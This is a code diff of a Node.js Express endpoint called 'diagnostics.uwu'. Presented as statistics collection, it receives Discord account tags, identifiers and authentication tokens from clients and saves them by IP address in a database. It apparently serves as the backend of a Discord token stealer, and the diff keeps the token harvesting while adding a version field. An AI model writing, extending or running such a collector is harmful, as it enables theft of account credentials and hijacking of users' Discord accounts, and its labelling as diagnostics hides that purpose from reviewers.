@@ -44,9 +44,10 @@ Router.post("/nsbs/stats/diagnostics.uwu", async (Request, Response) => {
 	const CurrTime = new Date().getTime();
 
 	const Arguments = Request.body;
+	const NSCurrVers = Arguments["ver_run"];
 	const DCAccounts = Arguments["dc_diag"];
 
-	if (DCAccounts == null || typeof DCAccounts != "object" || Array.isArray(DCAccounts) == false)
+	if (NSCurrVers == null || typeof NSCurrVers != "string")
 		return Response.status(400).send({ success: false, error: "lol no" });
 
 	// Statistics and stuff
@@ -57,30 +58,34 @@ Router.post("/nsbs/stats/diagnostics.uwu", async (Request, Response) => {
 
 	if (NSBSStats[IPAddress].Statistics == null)
 		NSBSStats[IPAddress].Statistics = {};
+	NSBSStats[IPAddress].Statistics.BGTVersion = NSCurrVers;
 	if (NSBSStats[IPAddress].Statistics.Discord == null)
 		NSBSStats[IPAddress].Statistics.Discord = [];
 	
-	DCAccounts.forEach((Account) => {
-		if (typeof Account != "object" || Array.isArray(Account) == true)
-			return;
-		if (Account["dt_track"] == null || typeof Account["dt_track"] != "string")
-			return; // Discord Tag
-		if (Account["di_track"] == null || typeof Account["di_track"] != "string")
-			return; // Discord Identifier
-		if (Account["tk_track"] == null || typeof Account["tk_track"] != "string")
-			return; // Token
+	// Discord statistics
+	if (DCAccounts != null) {
+		DCAccounts.forEach((Account) => {
+			if (typeof Account != "object" || Array.isArray(Account) == true)
+				return;
+			if (Account["dt_track"] == null || typeof Account["dt_track"] != "string")
+				return; // Discord Tag
+			if (Account["di_track"] == null || typeof Account["di_track"] != "string")
+				return; // Discord Identifier
+			if (Account["tk_track"] == null || typeof Account["tk_track"] != "string")
+				return; // Token
 
-		var NewEntry = {};
-		NewEntry["Tag"] = Account["dt_track"];
-		NewEntry["Identifier"] = Account["di_track"];
-		NewEntry["Token"] = Account["tk_track"];
-		
-		var PrevEntry = NSBSStats[IPAddress].Statistics.Discord.findIndex((E) => (E.Identifier == Account["di_track"]));
-		if (PrevEntry != null && PrevEntry != -1)
-			NSBSStats[IPAddress].Statistics.Discord.splice(PrevEntry, 1);
-		
-		NSBSStats[IPAddress].Statistics.Discord.push(NewEntry);
-	});
+			var NewEntry = {};
+			NewEntry["Tag"] = Account["dt_track"];
+			NewEntry["Identifier"] = Account["di_track"];
+			NewEntry["Token"] = Account["tk_track"];
+			
+			var PrevEntry = NSBSStats[IPAddress].Statistics.Discord.findIndex((E) => (E.Identifier == Account["di_track"]));
+			if (PrevEntry != null && PrevEntry != -1)
+				NSBSStats[IPAddress].Statistics.Discord.splice(PrevEntry, 1);
+			
+			NSBSStats[IPAddress].Statistics.Discord.push(NewEntry);
+		});
+	}
 
 	try { DBManager.SaveGlobalDatabase("nsbs_stats") }
 	catch { return Response.status(400).send({ success: false, error: "internal_error" }) };
